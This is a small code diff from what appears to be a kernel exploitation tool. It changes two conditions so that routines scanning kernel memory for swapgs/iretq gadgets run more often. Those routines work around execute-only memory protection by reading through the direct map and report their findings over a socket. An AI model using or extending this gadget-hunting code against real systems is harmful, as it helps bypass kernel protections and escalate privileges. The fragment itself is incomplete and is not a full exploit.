@@ -3413,7 +3413,7 @@ broad_done:
      * For each .data pointer into early .text, try to DMAP-read 8 bytes
      * at that address to check for swapgs+iretq or plain iretq.
      */
-    if (broad_blocked > broad_readable && have_text_pa) {
+    if (broad_blocked > 0 && have_text_pa) {
         send_response(sock, "\n--- Step 5b: .data Pointer Scan (XOM workaround) ---\n");
         send_response(sock, "XOM blocks %d/%d .text pages; scanning .data for early .text refs\n",
                       broad_blocked, broad_blocked + broad_readable);
@@ -3568,7 +3568,7 @@ broad_done:
      * (sizeof iretq), finding a pair of code references whose targets are
      * exactly 2 bytes apart is a very strong signal.
      */
-    if (broad_blocked > broad_readable && have_text_pa) {
+    if (broad_blocked > 0 && have_text_pa) {
         send_response(sock, "\n--- Step 5c: Code Reference Scan ---\n");
         send_response(sock, "Scanning readable .text for refs to early .text\n");
         send_response(sock, "  patterns: LEA [rip+disp], MOV r64 imm32 (sign-ext)\n");
